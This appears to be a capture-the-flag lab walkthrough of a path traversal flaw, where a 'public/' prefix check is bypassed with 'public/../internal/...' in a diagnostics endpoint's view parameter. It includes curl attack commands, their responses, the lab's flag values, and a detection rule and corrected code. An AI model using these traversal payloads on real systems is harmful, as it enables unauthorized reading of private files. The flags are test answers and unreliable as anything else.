## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Path traversal — a `view` parameter is concatenated onto a document root, and the guard only checks the *prefix* of the string |
| **Tools** | `curl` (that is genuinely all) |
| **Attack surface** | `GET /api/diagnostics/render?delivery_id=…&view=…` |
| **Prerequisite** | none; anonymous |
| **Flag** | `FLAG{3bf1d8651d39b64c}` |

**What you are about to read:** how a diagnostics endpoint with a `view=` filename
parameter lets you walk out of its document root with `public/../internal/...`, and why the
naive `../` attempt is rejected while the prefixed one is accepted. It is the cleanest
example in the whole range of a filter that validates **shape** instead of **meaning**.

## Objective

> Make the dispatch diagnostic helper reveal the internal delivery summary that its
> ordinary report leaves out.

The helper renders a JSON "diagnostic view" for a delivery. The public view omits routing
detail; the internal summary contains it.

## Background you need

The helper builds a filesystem path from user input:

```python
open(DOC_ROOT + view)          # e.g. DOC_ROOT = "/srv/workbench/views/"
```

The developer added a guard so callers cannot ask for arbitrary files:

```python
if not view.startswith("public/"):
    return 400, {"error": "invalid_request"}
```

The guard tests the **string**, but the filesystem resolves `..` **afterwards**. So any
input that both starts with `public/` and, once resolved, points outside `public/` satisfies
the check and escapes. This is the same class of mistake as `startswith("/srv/docs")`
checks that accept `/srv/docs-evil`.

## Walkthrough

### 1. Establish the baseline

```bash
curl -s 'http://workbench.training:8083/api/diagnostics/render?delivery_id=DL-204&view=public/DL-204.json'
```

```json
{"delivery_id":"DL-204","detail":"Internal routing detail omitted.","parcel_count":3,"state":"awaiting handover"}
```

`detail` literally says the useful field was withheld. That sentence is the hint: there is
another document with the field present.

### 2. Try the obvious traversal — and watch it fail

```bash
for v in internal/DL-204.json ../internal/DL-204.json ../../internal/DL-204.json; do
  printf '%-32s ' "$v"
  curl -s -o /tmp/r -w '%{http_code} ' \
    "http://workbench.training:8083/api/diagnostics/render?delivery_id=DL-204&view=$v"
  head -c 60 /tmp/r; echo
done
```

```text
internal/DL-204.json             400 {"error":"invalid_request"}
../internal/DL-204.json          400 {"error":"invalid_request"}
../../internal/DL-204.json       400 {"error":"invalid_request"}
```

All three are rejected — not because traversal is blocked, but because none of them *start
with* `public/`. That distinction is the whole trick.

### 3. Satisfy the prefix check, then escape

```bash
curl -s 'http://workbench.training:8083/api/diagnostics/render?delivery_id=DL-204&view=public/../internal/DL-204.json'
```

```json
{
  "courier_id": "CR-17",
  "delivery_id": "DL-204",
  "flag": "FLAG{3bf1d8651d39b64c}",
  "internal_note": "Retain the withdrawn amendment with the manifest audit.",
  "revision": 1,
  "routing": "Bay 4 sealed intake",
  "summary": "…"
}
```

200, and the internal summary — routing, internal note, flag — is all there.

### 4. Confirm the guard is the only thing that mattered

The same request with the prefix *removed* returns 400, and the same request with the prefix
*kept* returns 200. Nothing else about the string changed. That is the proof the check is
purely lexical.

## Why this works

Three independent mistakes stack:

1. **Trusting a string as a path.** `public/../internal/x` starts with `public/` and resolves
   to `internal/x`. Any validation done before resolution is validating a different value
   than the one the OS uses.
2. **A denylist-shaped guard.** The author thought "block `..` at the start" rather than "the
   resolved path must remain inside the root".
3. **The endpoint is a file reader by design.** Even with perfect traversal protection, a
   `view=` parameter that names files in a directory is a file-read primitive that must be
   scoped to an allowlist, not a prefix.

## Detection and fix

Defender signal: any request whose `view`/`file`/`template` parameter contains `..`
(encoded or not) — alert on it, because legitimate clients never send it.

Correct implementation:

```python
import pathlib
root = pathlib.Path("/srv/workbench/views").resolve()
target = (root / view).resolve()
if root not in target.parents:
    return 400, {"error": "invalid_request"}
```

Stronger, and what this endpoint should have done: take a **key** (`view=public`), not a
path, and map it to a filename server-side. A parameter that cannot express a path cannot
traverse one.

## Notes and dead ends

- `..%2finternal%2fDL-204.json` returned 400 as well: the server does not URL-decode before
  the prefix check, so encoded traversal never reaches the vulnerable join.
- `./../internal/...` and `public/../public/../internal/...` behaved identically to step 3.
- The git history of the sibling handover repo leaks a *different* flag
  (`FLAG{2e184cd91352e573}`) — that belongs to the deleted-content card (T01.1), not this one.
